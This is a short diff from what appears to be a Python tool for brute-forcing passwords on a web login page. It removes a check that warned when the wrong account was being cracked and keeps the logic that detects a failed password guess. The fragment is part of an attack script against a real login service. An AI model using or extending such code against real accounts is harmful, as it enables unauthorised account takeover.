@@ -84,12 +84,6 @@ def def_login():
 
 			# Attempt to brute force the password.
 			attempt = soup.find_all(action="/login.php?login_attempt=1&lwv=120&lwc=1348092")
-			account = soup.find_all(action="/login.php?login_attempt=1&lwv=120&lwc=1647001")
-			if (len(account) > 0):
-				color_print("[!] You might be trying to crack the wrong account", color='red')
-				break
-
-
 			if (len(attempt) > 0):
 				print("[!] Wrong password")
 				browser.select_form(nr = 0)
